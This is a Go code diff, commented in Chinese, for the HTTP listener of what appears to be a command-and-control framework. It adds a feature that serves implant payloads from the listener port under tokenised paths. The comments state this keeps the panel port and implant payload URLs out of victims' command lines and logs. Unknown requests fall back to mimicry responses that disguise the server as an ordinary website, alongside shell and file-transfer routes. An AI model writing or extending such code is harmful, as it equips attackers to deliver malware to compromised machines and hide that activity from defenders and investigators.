@@ -55,6 +55,12 @@ type HTTPListener struct {
 	downMu    sync.Mutex
 	downQueue map[string][][]byte
 
+	// payloadHost 载荷托管处理器（v1.4.3 #15b-B）：把"下载载荷"从面板端口搬到
+	// 监听器端口，路径形如 /<prefix>/<token>/<文件名>，URL 里不出现面板入口。
+	// 入参 rest 是前缀之后的子路径（不含前导斜杠）；返回 false = 不认识，
+	// 由调用方回退到拟态响应（与"路径不存在"不可区分）。
+	payloadHost func(w http.ResponseWriter, r *http.Request, rest string) bool
+
 	// ─── 会话令牌（审计 M2）───────────────────────────────────────────────
 	// sessionID → 每次注册时生成的 32 字节随机 hex token。
 	//
@@ -261,6 +267,56 @@ func (l *HTTPListener) SetOnSessionOnline(cb func(info *types.SessionInfo)) {
 	l.onSessionOnline = cb
 }
 
+// SetPayloadHost 注入「载荷托管」处理器（v1.4.3 #15b-B）。
+//
+// 语义：监听器把 /<prefix>/ 开头的 GET/HEAD 交给 fn；fn 返回 true 表示已写出响应，
+// 返回 false 则回落到拟态/404（对外与"该路径不存在"不可区分）。未注入时该路由不注册。
+func (l *HTTPListener) SetPayloadHost(fn func(w http.ResponseWriter, r *http.Request, rest string) bool) {
+	l.payloadHost = fn
+}
+
+// payloadHostPrefix 返回归一化后的托管前缀（空 = 未启用）。
+// 只接受 [A-Za-z0-9._-]，非法值一律视为未启用（宁可回退到面板下载，也不注册奇怪路由）。
+func (l *HTTPListener) payloadHostPrefix() string {
+	if l.cfg == nil || !l.cfg.PayloadHostEnabled || l.payloadHost == nil {
+		return ""
+	}
+	p := strings.Trim(strings.TrimSpace(l.cfg.PayloadHostPrefix), "/")
+	if p == "" {
+		p = "s"
+	}
+	for _, r := range p {
+		ok := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
+			r == '.' || r == '_' || r == '-'
+		if !ok {
+			return ""
+		}
+	}
+	return p
+}
+
+// handlePayloadHost 托管下载入口：前缀之后的子路径交给注入的处理器。
+func (l *HTTPListener) handlePayloadHost(w http.ResponseWriter, r *http.Request) {
+	prefix := l.payloadHostPrefix()
+	if prefix == "" {
+		l.rootHandler(w, r)
+		return
+	}
+	if r.Method != http.MethodGet && r.Method != http.MethodHead {
+		l.rootHandler(w, r)
+		return
+	}
+	rest := strings.TrimPrefix(r.URL.Path, "/"+prefix+"/")
+	if rest == "" || rest == r.URL.Path {
+		l.rootHandler(w, r)
+		return
+	}
+	if l.payloadHost != nil && l.payloadHost(w, r, rest) {
+		return
+	}
+	l.rootHandler(w, r)
+}
+
 // getMimicry 返回当前拟态模板（加锁读取，支持运行时热更新）。
 func (l *HTTPListener) getMimicry() *mimicry.Profile {
 	l.mimicryMu.RLock()
@@ -288,6 +344,11 @@ func (l *HTTPListener) Start() error {
 	mux.HandleFunc("/shell", l.handleShellHTTP)
 	mux.HandleFunc("/file", l.handleFileHTTP)
 	mux.HandleFunc("/file/pull", l.handleFilePullHTTP)
+	// 载荷托管（v1.4.3 #15b-B）：/s/<token>/<文件名> 由监听器端口直接下发，
+	// 目标机的命令行/日志里不再出现面板端口与 /api/v1/implant/payload/。
+	if prefix := l.payloadHostPrefix(); prefix != "" {
+		mux.HandleFunc("/"+prefix+"/", l.handlePayloadHost)
+	}
 	// 根路径兜底：所有非 C2 路径的探测请求返回拟态内容。
 	// 配置了 mimicry_site 时反向代理到目标网站（与真实站一致）；
 	// 否则返回静态拟态模板。每次请求取当前配置，支持运行时热更新。
